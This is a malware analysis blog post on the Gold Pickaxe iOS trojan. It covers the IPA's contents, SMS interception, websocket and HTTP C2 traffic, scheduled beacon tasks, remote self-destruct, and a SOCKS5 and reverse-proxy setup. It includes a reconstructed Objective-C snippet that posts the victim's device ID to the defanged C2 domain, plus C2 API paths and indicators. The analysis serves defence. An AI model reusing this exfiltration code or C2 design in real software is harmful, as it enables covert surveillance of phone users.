---
title:  "Gold Pickaxe iOS Technical Analysis: IPA Overview and C2 Communication Startup"
authors: ["Raffaele Sabato"]
date:   2024-04-19
tags: ["malwares","iOS"]
thumbnail:
  url: img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img0.png
  author: Deep AI
  authorURL: https://deepai.org
---

In February 2024 **Group-IB** wrote a [blog post](https://www.group-ib.com/blog/goldfactory-ios-trojan/) about a mobile **Trojan** developed by a Chinese-speaking cybercrimine group called **Gold Pickaxe**.

This malware targets both **iOS** and **Android** users in the Asia Pacific region in order to collect identity documents, SMS, pictures and other data related to the compromised phones.

The malware communicates with the C2 using two protocols:
* The **websocket** protocol used to listen for incoming commands
* The **HTTP** protocol used to send information and data to the **C2**

In this article we are going to analyse the **IPA** file, and then describe how the malware connects to the **C2 websocket** server.

How the malware listens for incoming commands and executes them are not in the scope of this blog post.

# Technical Analysis 

## IPA Overview 

The **SHA-256** of the **IPA** file is **4571f8c8560a8a66a90763d7236f55273750cf8dd8f4fdf443b5a07d7a93a3df**, and it is reported as malicious on [VirusTotal](https://www.virustotal.com/gui/file/4571f8c8560a8a66a90763d7236f55273750cf8dd8f4fdf443b5a07d7a93a3df).

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img1.png" caption="Figure 1 - VirusTotal Digital Pensions.ipa" wrapper="text-center">}} 

The application bundle contains all the application files, there are interesting files related to the **fast reverse proxy** configuration, the **html** pages shown to the user, and a **plugin** used to intercept sms.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img2.png" caption="Figure 2 - Chinp.app Bundle" wrapper="text-center">}} 


The iOS application is signed with the following information:
* **Bundle ID**: com.want.long.chinp
* **Associated Domain**: apple.hzc5[.]xyz
* **Developer Team ID**: 27S3W42PY8

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img3.png" caption="Figure 3 - Chinp.app Codesign" wrapper="text-center">}} 

Obviously the associated domain is reported as malicious.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img4.png" caption="Figure 4 - VirusTotal Associated Domain" wrapper="text-center">}} 

Analyzing the **Info.plist** file, we can see interesting information: the application name is **Digital Pensions**, the bundle id is **com.want.long.chinp**, furthermore the following settings let us know that the malware accesses the photo library and camera:
* Privacy - Photo Library Usage Description
* Privacy - Photo Library Additions Usage Description
* Privacy - Camera Usage Description

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img5.png" caption="Figure 5 - Chinp.app Info.plist" wrapper="text-center">}} 

The **config.ini** file contains information related to the **fast reverse proxy** configuration as shown in the image below. 

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img6.png" caption="Figure 6 - FRP Con" wrapper="text-center">}} 

The values “**#server_addr**”, “**#server_port**”,”**#token**”, “**#adid**” and “**#remote_port**” will be replaced with values received from the **C2**.

The plugins folder contains an extension called **messagefilter.appex**, according to **Group-IB** due to Apple restrictions, this extension can only intercept SMS received from numbers that are not in the contact list

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img7.png" caption="Figure 7 - messagefilter.appex Content" wrapper="text-center">}} 

In the extension **Info.plist** we can find the URL used to exfiltrate the intercepted sms.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img8.png" caption="Figure 8 - C2 SMS Url" wrapper="text-center">}} 

The **mach-o** file contains chinese language strings used in logs and thai language strings that are shown to the user, this confirms that the app is developed by a Chinese-speaking group targetting thai users.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img9.png" caption="Figure 9 - Chinese and Thai Strings" wrapper="text-center">}} 

# Reverse Engineering

## Identify The Device 

The malware identifies each victim using an **Identifiers for Advertisers** (**IDFA**), the **IDFA** is sent in every **HTTP** request in order to identify the device.
The **+[commonUtils getAdid]** method is executed to obtain the **IDFA**, it is just a wrapper for the **+[SimulateIDFA createSimulateIDFA]** method as shown in the image below.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img10.png" caption="Figure 10 - getAdid method" wrapper="text-center">}} 

The [SimulateIDFA](https://github.com/youmi/SimulateIDFA) project is publicly available on github, the **createSimulateIDFA** method is the same of the github project.

It is possible to recognize the entire method in the disassembler; for example, in the following image, we can see the **carrierInfo** function.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img11.png" caption="Figure 11 - carrierInfo Function" wrapper="text-center">}} 

## HTTP Requests 

The Malware sends data and information to the **C2** using the **HTTP** protocol, it uses the **AFHTTPSessionManager** class to execute a **HTTP Post** Request via the [POST:parameters:headers:constructingBodyWithBlock:progress:success:failure:](https://asciidoxy.org/examples/objc/example-objc.html#objc-interfaceAFHTTPSessionManager_1af5ad6a2e3df65803070fcb6418b7e0fc) method.

We can see the method details below.

~~~Objective-C
- (nullable NSURLSessionDataTask *)POST:(NSString *)URLString
                             parameters:(nullable id)parameters
                                headers:(nullable NSDictionary<NSString *, NSString *> *)headers
              constructingBodyWithBlock:(nullable void(id<AFMultipartFormData> formData))block
                               progress:(nullable void(NSProgress * uploadProgress))uploadProgress
                                success:(nullable void(NSURLSessionDataTask * task, id _Nullable responseObject))success
                                failure:(nullable void(NSURLSessionDataTask *_Nullable task, NSError * error))failure;
~~~

Parameters:

* **POST**: the URL string used to create the request URL
* **parameters**: the parameters to be encoded according to the client request serializer
* **headers**: the headers appended to the default headers for this request
* **constructingBodyWithBlock**: a block that takes a single argument and appends data to the HTTP body. The block argument is an object adopting the AFMultipartFormData protocol
* **progress**: a block object to be executed when the upload progress is updated. Note this block is called on the session queue, not the main queue
* **success**: a block object to be executed when the task finishes successfully. This block has no return value and takes two arguments: the data task, and the response object created by the client response serializer
* **failure**: a block object to be executed when the task finishes unsuccessfully, or that finishes successfully, but encountered an error while parsing the response data. This block has no return value and takes a two arguments: the data task and the error describing the network or parsing error that occurred

Based on the specific API used by the malware some parameters can be set or not and in some case they can be different.

For example **(nullable id)parameters** is a Dictionary contains the parameters that are send to the **C2** , each parameter is a key-value pair. The **adid** key with the **IDFA** value is send in each request, other parameters depends on the specific API purpose (for example the API used to send crash information has another parameter contains a string representing the crash details). 
Some API can set or not the **block**, **success** and **failure** params in order to execute specific function if the request succeeds or fails.
A generic snippet of the **HTTP** request is the following.

~~~Objective-C
AFHTTPSessionManager *manager = [AFHTTPSessionManager manager];

[manager setResponseSerializer:[AFHTTPResponseSerializer serializer]];

NSString *urlString = [NSString stringWithFormat:@"%@%@", @"http://hzc5[.]xyz", @"/api/apple/xxxx"];

NSString *keys[] = {@"adid", ... /* keys */};

NSString *objects[] = {[CommonUtils getAdid], ..., /* values */};

NSDictionary *parameters = [NSDictionary dictionaryWithObjects:objects
                                             forKeys:keys
                                             count: /* number of parameters */
                           ];

[manager POST:urlString
      parameters:parameters
      headers:nil
      constructingBodyWithBlock: /* can be set or not */ 
      progress:nil
      success:nil /* can be set or not */
      failure:nil /* can be set or not */
];
~~~

## Application Startup 

When the application starts, the **-[AppDelegate application:didFinishLaunchingWithOptions:]** method is executed.
If there were crashes, the malware gets the crash detail (**getCrash**), saves the crash detail in the **standUserDefaults** and sends it to the C2 (the two **saveCrash** method), after that, the malware checks if the application should be terminated (**isDestory**). If that's the case the application exits (**_exit**), otherwise it sets the **isStartFrp** flag variable to **0** (this variable is used to determine if the **fast reverse proxy** is executed).

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img12.png" caption="Figure 12 - GetCrash and isDestory Methods" wrapper="text-center">}} 

### getCrash

The **+[UserDefaultsManager getCrash:]** method is responsible to get the crashes details, we are not going to show its details.


### saveCrash 

The **+[HttpUtils saveCrash:]** method executes a **HTTP** Post request to "**/api/apple/savecrash**", it sends two parameters:
* **adid** with the **IDFA** value
* **content** with the crash details
If the request succeeds the malware executes a function that print a log message, otherwise the malware executes another function that do a **RET** instruction.

In the screenshow below we can see the **saveCrash** method.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img13.png" caption="Figure 13 - HttpUtils saveCrash Method" wrapper="text-center">}} 

The **+[UserDefaultsManager saveCrash:]** method is responsible to save the crashes details into the **standUserDefaults**, we are not going to show its details.


### isDestory 

The **+[UserDefaultsManager isDestory]** method is responsible to check if the application should be terminated, this is done by checks if the key “**isDestory**” in the standardUserDefaults is set to **1**.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img14.png" caption="Figure 14 - UserDefaultsManager isDestory Method" wrapper="text-center">}} 

### Websocket Connection 

After all these checks, the malware tries to connect to the **websocket** server using the [JetFire library](https://github.com/acmacalister/jetfire) from github. In the disassembler we can recognize the code snipet from the github readme.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img15.png" caption="Figure 15 - Websocket Connection" wrapper="text-center">}} 

## Scheduled Tasks 

At this point the malware uses the **NSTimer** class to invoke the [scheduledTimerWithTimeInterval:target:selector:userInfo:repeats:](https://developer.apple.com/documentation/foundation/nstimer/1412416-scheduledtimerwithtimeinterval) method to schedule fours tasks. We can see the method details below.

~~~Objective-C
+ (NSTimer *)scheduledTimerWithTimeInterval:(NSTimeInterval)ti 
                                     target:(id)aTarget 
                                   selector:(SEL)aSelector 
                                   userInfo:(id)userInfo 
                                    repeats:(BOOL)yesOrNo;

~~~

Parameters:
* **timeinterval**: the number of seconds between firings of the timer. If it is less than or equal to 0.0, this method chooses the nonnegative value of 0.0001 seconds instead
* **target**: the object to which to send the message specified by aSelector when the timer fires. The timer maintains a strong reference to target until it (the timer) is invalidated
* **selector**: the message to send to target when the timer fires
* **userInfo**: the user info for the timer. The timer maintains a strong reference to this object until it (the timer) is invalidated
* **repeats**: if YES, the timer will repeatedly reschedule itself until invalidated. If NO, the timer will be invalidated after it fires

The malware schedules the execution of four tasks: **sendHeartbeat**, **checkAuth**, **checkWifi**, and **testSpeed**.

### sendHeartbeat 

The **-[AppDelegate sendHeartbeat]** methods is used to let the C2 know that the malware is alive on the victim's phone. It writes che strings “**heartbeat**” on the **websocket** connection. 

Let’s see how it is executed and how it works.

Before schedule the task, the malware saves the value **10** (**0x40A00000**) in a **float** variable called “**heartTime**”, after that it schedules the task to execute the **sendHeartbeat** method after a Time Interval of **5.0** ms, the repeats param is set to **1**, this means that the task will reschedule itself.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img16.png" caption="Figure 16 - sendHeartbeat Task" wrapper="text-center">}}

The **sendHeartbeat** method checks if the **websocket** connection is up, if not it tries to reconnect, otherwise if the value of the “**heartTime**” is not equal to **5.0**, it invalidates and reschedules the task again with a Time Interval of **104** ms ( **0x41A00000**). Then the method writes the string “**Heartbeat**” on the **websocket** connection.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img17.png" caption="Figure 17 - sendHeartbeat Method" wrapper="text-center">}}

### checkAuth 

The **-[AppDelegate checkAuth]** method checks if the user has given the application permission to access the photo library.

The malware schedules the **checkAuth** method with a Time Interval of **34.5** ms (**0x404E000000000000**), as for the previous task, the **repeats** param is set to **1**, this means that this task will reschedule itself.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img18.png" caption="Figure 18 - checkAuth Task" wrapper="text-center">}}

The **checkAuth** method executes the **hasPicAuth** method that it just a wrapper for the **+[PHPhotoLibrary authorizationStatus]** method used to check if the user has given the application permission related to the photo library.

If the permission is enabled, the malware executes the **+[HttpUtils updateAuth:auth:]** method with two arguments, the strings “**2**” and “**1**”.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img19.png" caption="Figure 19 - checkAuth Method" wrapper="text-center">}}

The **updateAuth:auth:** method performs a **HTTP Post** request to “**/api/apple/applyauth**”, it sends three parameters:
* **adid** with the IDFA value
* **type** with the value **2**
* **auth** with the value **1**

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img20.png" caption="Figure 20 - updateAuth:auth: Method" wrapper="text-center">}}

### checkWifi 

The **-[AppDelegate checkWifi]** method is used to check if the phone is connected via WiFi.

The malware schedules the **checkWifi** method with a Time Interval of **30** ms , the repeats param is set to **1** in this case too.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img21.png" caption="Figure 21 - checkWifi Task" wrapper="text-center">}}

The **checkWifi** method is just a wrapper for the **+[HttpUtils changeWifiStatus]** method that performs a **HTTP Post** request to “**/api/apple/changewifistatus**”, it sends two parameters:
* **adid** with the **IDFA** value
* **is_wifi** with the value returned from the **+[HttpUtils isWifi]** method

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img22.png" caption="Figure 22 - changeWifiStatus Method" wrapper="text-center">}}

The **isWiFi** method compares the return value of the [opensource](https://github.com/tonymillion/Reachability/) **-[Reachability currentReachabilityStatus]** method, if the returned value is **2** (it means that the WiFi is used) it returns **1** otherwise it returns **0**.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img23.png" caption="Figure 23 - isWiFi Method" wrapper="text-center">}}

We can recognize the **currentReachabilityStatus** method in the disassembler.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img24.png" caption="Figure 24 - currentReachabilityStatus Method" wrapper="text-center">}}

### testSpeed

The **-[AppDelegate testSpeed]** method is used to calculate information related to the connection speed.

The malware execute the **-[AppDelegate testSpeed]** method, and then schedules the execution of the same method with a Time Interval of **34.5** ms , the repeats param is set to **1** in this case too.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img25.png" caption="Figure 25 - testSpeed Task" wrapper="text-center">}}

The **testSpeed** method executes the ping command to “www.google.com” using the **PPSPing** [open source project](https://github.com/yangqian111/PPSPing/). It uses two variable to calculate the connection speed:
* **integer pingCount** contains the number of pings
* **double pingTime** contains the ping ms result

In the following screenshot we can see that the two variable are initialize to **0**, and then we can recognize the **PPSPing startWithCallbackHandler** method.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img26.png" caption="Figure 26 - testSpeed Method" wrapper="text-center">}}

The **callback** function checks the value of the **pingCount** variable and perform the following actions:

* if **pingCount<= 9**: it updates the the **pingTime** and the **pingCount** variables
* if **pingCount> 9**: it calculates the signal value (**pingTime/pingCount**), stops the ping execution, and call the **+[HttpUtils changeSigna:]** with the calculated signal values as parameter

The **changeSigna**: method performs a **HTTP Post** request to “**/api/apple/changesignal**" with two parameters:
* **adid** with the **IDFA** value
* **signal** with the calculated value (**pingTime/pingCount**)

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img27.png" caption="Figure 27 - changeSigna Method" wrapper="text-center">}}

## Websocket Callback 

When the **JetFire** library websocket connection succeeds, the delegate method **-[AppDelegate websocketDidConnect:]** is executed.

It calls the **-[AppDelegate checkDestruction]** method responsible to ask the C2 if the application should be terminated.

If the application is not terminated, the **isStartFrp** flag variable is checked, if the value of the variable is **1**, the method exits because the **fast reverse proxy** is already running, otherwise it executes the **-[AppDelegate getFrpConfigStart]** method via **dispatch_after**.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img28.png" caption="Figure 28 - websocketDidConnect Method" wrapper="text-center">}}

### checkDestruction 

The **checkDestruction** method performs a **HTTP Post** request to “**/api/apple/checkdestruction**” by sending the **adid** with the **IDFA** value as parameter, it also sets a function to be execute if the request succeeds.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img29.png" caption="Figure 29 - checkDestruction Method" wrapper="text-center">}}

The executed function (if the request suceeds) checks if the received value from the C2 is the string “**1**" and in this case it executes the **setDestory** method that is responsible to add the key **isDestroy** with value “**1**" in the **standardUserDefaults** (if you remember the **+[UserDefaultsManager isDestory]** method checks this value), then it executes a wrapper for the **exit** function via **dispatch_time**.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img30.png" caption="Figure 30 - Succes Executed Function" wrapper="text-center">}}

### getFrpConfigStart 

The **-[AppDelegate getFrpConfigStart]** method, performs a **HTTP Post** request to “**/api/apple/getfrpconfig**" by sending the **adid** with the **IDFA** value as parameter, if the request succeeds, the **sub_10001340C** function is executed.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img31.png" caption="Figure 31 - getFrpConfigStart Method" wrapper="text-center">}}

The **sub_10001340C** function parses the server response in order to get the configuration values for the **fast reverse proxy**.

It reads the **config.ini** file, and replace each value for the **server_addr**, **server_port**, **token** and **remote_port** keys with the ones received from the C2 server.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img32.png" caption="Figure 32 - sub_10001340C Method" wrapper="text-center">}}

After replaced each value, it writes the new configuration in a new file called **newconfig.ini** then it executes the **-[AppDelegate setIsStartFrp:]** responsible for setting the variable **isStartFrp** to **1**.

At this point it executes two **dispatch_async** function to set up the **socks5** server and the **fast reverse proxy**.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img33.png" caption="Figure 33 - sock5 and fast reverse proxy Methods" wrapper="text-center">}}

The **sock5** server is implemented using the [open source portable socks5 server](https://github.com/rofl0r/microsocks) **microsocks** we can recognize it in the disassembler.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img34.png" caption="Figure 34 - microsocks" wrapper="text-center">}}

The fast reverse proxy, is implemented using the [open source project](https://github.com/fatedier/frp) **FRP**.

{{< image src="img/2024-04-19-goldpickaxe-technical-analysis-ipa-c2/img35.png" caption="Figure 35 - FRP" wrapper="text-center">}}

# Conclusion

The opportunity to analyze iOS malware is very rare, so diving into the **Gold Pickaxe** sample was an interesting experience.

We examined the **IPA** content and observed how the malware connects to the C2 using the **webSocket**  and the **HTTP** protocols to establish the connection and send data. 

Analyzing the entire malware would provide valuable insights into how the received commands are processed. 

Due to the European **Digital Market Act**, Apple will be required to permit the use of external markets, which could potentially be used by cybercriminals to introduce iOS malware.
